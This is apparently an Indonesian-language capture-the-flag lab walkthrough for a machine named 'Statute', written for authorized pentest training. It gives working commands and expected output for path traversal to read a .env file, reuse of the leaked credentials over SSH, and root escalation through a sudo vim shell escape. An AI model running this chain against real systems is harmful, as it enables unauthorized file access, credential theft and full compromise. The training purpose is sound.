# 04 — Pembahasan Detail Lab Statute
## Path Traversal → .env → SSH Operator → sudo Vim → Root

> Dokumen ini untuk pembelajaran pentest pada **lab yang berizin**.  
> Fokus pembelajaran: bagaimana arbitrary file read dapat membuka credential, lalu privilege escalation melalui sudo misconfiguration.

---

## 1. Gambaran Umum

Lab Statute mengajarkan serangan yang sederhana tetapi sangat umum:

```text
Endpoint download menerima parameter file
→ path traversal membaca ../.env
→ .env berisi credential operator
→ credential dipakai untuk SSH
→ sudo -l menunjukkan operator boleh menjalankan vim sebagai root
→ Vim shell escape
→ root
→ cari flag
```

Di lab ini, tidak perlu upload shell atau exploit kernel. Kunci utamanya adalah memahami alur kebocoran file konfigurasi dan penyalahgunaan sudo.

---

## 2. Data Lab

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.120` |
| Web | `http://192.168.56.120:8080` |
| SSH | port `22` |
| Celah awal | Path Traversal pada parameter `file` |
| File target | `../.env` |
| User SSH | `operator` |
| Privesc | `sudo vim` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Konsep yang Dipelajari

### 3.1 Path Traversal

Path traversal terjadi ketika aplikasi mengizinkan user mengontrol path file tanpa pembatasan yang benar.

Contoh request normal:

```text
/download?file=uu-1-2024.pdf
```

Jika aplikasi membaca file dari folder `documents`, maka request di atas mungkin mengarah ke:

```text
documents/uu-1-2024.pdf
```

Jika kita memberi:

```text
../.env
```

maka path menjadi:

```text
documents/../.env
```

yang berarti `.env` pada root aplikasi.

### 3.2 File `.env`

File `.env` sering berisi konfigurasi aplikasi seperti:
- username database;
- password database;
- secret key;
- nama database.

Pada lab ini, `.env` berisi credential yang dapat digunakan ke SSH.

### 3.3 sudo Vim

Vim memiliki fitur shell escape:

```vim
:!/bin/sh
```

Jika Vim dijalankan sebagai root melalui sudo, shell yang keluar juga root.

---

## 4. Fase 1 — Recon

### Tujuan

Menemukan service web, SSH, dan endpoint download.

### Command

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
dirsearch -u "$WEB" -e php,html,txt,bak,env
```

### Output yang Diharapkan

```text
22/tcp   open ssh
8080/tcp open http

/download
/download.php
/documents
```

### Penjelasan

Port SSH penting karena credential yang bocor nanti dapat diuji untuk login. Endpoint download menjadi kandidat path traversal.

---

## 5. Fase 2 — Baseline Respons

### Tujuan

Membedakan respons file valid, file tidak ada, dan traversal berhasil.

### File Valid

```bash
curl --path-as-is -i "$WEB/download?file=uu-1-2024.pdf"
```

### Output

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

### File Tidak Ada

```bash
curl --path-as-is -i "$WEB/download?file=missing.pdf"
```

### Output

```text
HTTP/1.1 404 Not Found
```

### Penjelasan

Baseline membantu kita mengenali perbedaan respons. Jika traversal berhasil, responsnya akan berbeda dari `404`.

---

## 6. Fase 3 — Membaca `.env`

### Command

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

### Output yang Diharapkan

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

### Penjelasan

`--path-as-is` mencegah curl menormalisasi path. Header User-Agent browser kadang diperlukan apabila aplikasi membedakan request dari browser dan tool.

Output `.env` membuktikan arbitrary file read/path traversal.

---

## 7. Fase 4 — Credential Reuse ke SSH

### Tujuan

Menguji apakah credential dari `.env` juga digunakan sebagai akun sistem.

### Command

```bash
ssh operator@"$TARGET"
```

Password:

```text
<PASSWORD_DARI_ENV>
```

### Validasi

```bash
whoami
id
hostname
pwd
```

### Output yang Diharapkan

```text
operator
uid=1001(operator)
statute
/home/operator
```

### Penjelasan

Kita tidak menebak password. Password berasal dari file konfigurasi aplikasi. Ini disebut credential reuse.

---

## 8. Fase 5 — Enumerasi Sudo

### Tujuan

Mengetahui command apa yang dapat dijalankan oleh operator sebagai root.

### Command

```bash
sudo -l
```

### Output Lab

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

### Penjelasan

Jika user boleh menjalankan program interaktif sebagai root, cek apakah program tersebut dapat membuka shell. Vim adalah contoh klasik karena mendukung `:!/bin/sh`.

---

## 9. Fase 6 — Root via Vim

### Cara Cepat

```bash
sudo vim -c ':!/bin/sh'
```

### Output yang Diharapkan

```text
# whoami
root
# id
uid=0(root) gid=0(root)
```

### Penjelasan

Parameter `-c` membuat Vim langsung menjalankan command internal. Command `:!/bin/sh` berarti Vim menjalankan `/bin/sh` dari dalam session Vim.

Karena Vim dijalankan via sudo sebagai root, shell juga root.

---

## 10. Cara Interaktif Alternatif

Jika cara cepat kurang stabil:

```bash
sudo vim
```

Di dalam Vim ketik:

```vim
:!/bin/bash
```

Keluar dari shell:

```bash
exit
```

Keluar dari Vim:

```vim
:q!
```

---

## 11. Fase 7 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Contoh

```text
/root/flag.txt
```

### Baca Flag

```bash
cat /PATH/FLAG
```

---

## 12. Troubleshooting Statute

### `.env` menghasilkan 403

Tambahkan User-Agent:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

### `.env` menghasilkan 404

Coba kedalaman path lain secara terbatas:

```text
../../.env
../../../.env
```

### SSH gagal

Pastikan:
- username dari `.env` benar;
- password dari `.env` benar;
- SSH port 22 terbuka.

```bash
nmap -Pn -sV -p22 "$TARGET"
```

### `sudo vim -c ':!/bin/sh'` langsung keluar

Gunakan cara interaktif:

```bash
sudo vim
```

Lalu:

```vim
:!/bin/bash
```

---

## 13. Ringkasan Hafalan Statute

```text
nmap lihat 22 dan 8080
temukan download
baseline 200 dan 404
curl ../.env
DB_USERNAME operator
DB_PASSWORD
ssh operator
sudo -l
(root) /usr/bin/vim
sudo vim -c ':!/bin/sh'
root
find flag
cat flag
```
